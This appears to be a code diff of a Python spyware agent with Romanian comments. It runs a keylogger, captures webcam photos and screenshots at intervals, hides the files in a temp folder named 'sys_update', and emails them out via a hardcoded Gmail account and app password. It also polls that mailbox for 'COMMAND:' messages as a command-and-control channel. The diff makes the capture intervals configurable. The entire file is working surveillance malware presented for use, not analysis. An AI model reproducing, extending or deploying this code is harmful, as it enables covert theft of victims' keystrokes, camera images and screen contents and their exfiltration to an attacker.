@@ -9,12 +9,11 @@ from PIL import ImageGrab
 import cv2
 import os
 import sys
-import ctypes
+import tempfile
 from datetime import datetime
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 from email.mime.image import MIMEImage
-import tempfile
 
 # ====================== CONFIGURARE SMTP ======================
 SMTP_CONFIG = {
@@ -24,27 +23,34 @@ SMTP_CONFIG = {
     'password': 'cxzv ddop qosk hvdy'
 }
 
+
 class Agent:
     def __init__(self):
         self.recipient_email = None
         self.keylogger_running = False
         self.camera_running = True
         self.screenshot_running = True
-        
+       
         self.key_listener = None
         self.buffer = ""
-        
+       
         self.base_folder = os.path.join(tempfile.gettempdir(), "sys_update")
         self.photo_folder = os.path.join(self.base_folder, "photos")
         self.screenshot_folder = os.path.join(self.base_folder, "screenshots")
-        
+       
         os.makedirs(self.photo_folder, exist_ok=True)
         os.makedirs(self.screenshot_folder, exist_ok=True)
         
+        # Intervale (modificabile din C2)
+        self.key_interval = 15
+        self.camera_interval = 15
+        self.capture_interval = 15
+       
         print("[+] Agent pornit - Așteaptă SET_RECIPIENT din C2")
+        print(f"[+] Intervale inițiale → Key: {self.key_interval}s | Camera: {self.camera_interval}s | Screenshot: {self.capture_interval}s")
 
-        self.start_keylogger()          # Pornim keylogger-ul
-        self.start_keylog_sender()      # Trimitem tastele individual
+        self.start_keylogger()
+        self.start_keylog_sender()
         self.start_auto_camera()
         self.start_auto_screenshot()
         self.start_command_checker()
@@ -54,7 +60,6 @@ class Agent:
         if not self.recipient_email:
             print("[-] Adresa de recepție nu este setată!")
             return False
-
         try:
             msg = MIMEMultipart()
             msg['From'] = SMTP_CONFIG['email']
@@ -74,7 +79,7 @@ class Agent:
                 server.starttls()
                 server.login(SMTP_CONFIG['email'], SMTP_CONFIG['password'])
                 server.send_message(msg)
-            
+           
             print(f"[+] Trimis: {subject}")
             return True
         except Exception as e:
@@ -85,7 +90,7 @@ class Agent:
     def start_keylogger(self):
         if self.keylogger_running: return
         self.keylogger_running = True
-        
+       
         def on_press(key):
             try:
                 char = key.char
@@ -98,10 +103,9 @@ class Agent:
                     char = "[BACK]"
                 else:
                     char = f"[{str(key).replace('Key.', '')}]"
-            
-            self.buffer += char
            
-
+            self.buffer += char
+          
         self.key_listener = keyboard.Listener(on_press=on_press)
         self.key_listener.start()
         print("[+] Keylogger pornit")
@@ -109,15 +113,15 @@ class Agent:
     def start_keylog_sender(self):
         def loop():
             while True:
-                time.sleep(25)
+                time.sleep(self.key_interval)          # MODIFICAT
                 if self.buffer.strip():
                     self.send_email("KEYLOG", f"Keylogger Report:\n\n{self.buffer}")
                     print(f"[+] Keylogger trimis ({len(self.buffer)} caractere)")
-                    self.buffer = ""   # Golim buffer-ul
+                    self.buffer = ""
                 else:
                     print("[DEBUG] Buffer gol")
         threading.Thread(target=loop, daemon=True).start()
-        print("[+] Trimitere keylog individual pornită (25 secunde)")
+        print(f"[+] Trimitere keylog individual pornită ({self.key_interval} secunde)")
 
     # ====================== CAMERA ======================
     def start_auto_camera(self):
@@ -136,9 +140,9 @@ class Agent:
                 finally:
                     if 'cap' in locals():
                         cap.release()
-                time.sleep(60)
+                time.sleep(self.camera_interval)       # MODIFICAT
         threading.Thread(target=loop, daemon=True).start()
-        print("[+] Auto Camera pornită (60 secunde)")
+        print(f"[+] Auto Camera pornită ({self.camera_interval} secunde)")
 
     # ====================== SCREENSHOT ======================
     def take_screenshot(self):
@@ -155,9 +159,9 @@ class Agent:
         def loop():
             while self.screenshot_running:
                 self.take_screenshot()
-                time.sleep(90)
+                time.sleep(self.capture_interval)      # MODIFICAT
         threading.Thread(target=loop, daemon=True).start()
-        print("[+] Auto Screenshot pornit (90 secunde)")
+        print(f"[+] Auto Screenshot pornit ({self.capture_interval} secunde)")
 
     # ====================== COMENZI ======================
     def start_command_checker(self):
@@ -167,13 +171,12 @@ class Agent:
                     pop_conn = poplib.POP3_SSL('pop.gmail.com', 995)
                     pop_conn.user(SMTP_CONFIG['email'])
                     pop_conn.pass_(SMTP_CONFIG['password'])
-                    
+                   
                     num_messages = len(pop_conn.list()[1])
                     for i in range(max(1, num_messages - 20), num_messages + 1):
                         raw_email = b"\n".join(pop_conn.retr(i)[1])
                         msg = email.message_from_bytes(raw_email)
                         subject = msg.get('Subject', '').strip()
-
                         if subject.startswith('COMMAND:'):
                             command = subject[9:].strip()
                             print(f"[*] Comandă primită: {command}")
@@ -183,17 +186,17 @@ class Agent:
                                     self.recipient_email = new_email
                                     print(f"[+] Recepție setată la: {new_email}")
                                     self.send_email("INFO", f"Adresă actualizată: {new_email}")
-                    
+                   
                     pop_conn.quit()
                 except:
                     pass
-                time.sleep(25)
+                time.sleep(10)   # checker interval (poate fi modificat ulterior)
         threading.Thread(target=loop, daemon=True).start()
 
 if __name__ == "__main__":
     agent = Agent()
     print("Agentul rulează. Trimite comanda SET_RECIPIENT: din C2 Server.")
-    
+   
     try:
         while True:
             time.sleep(1)
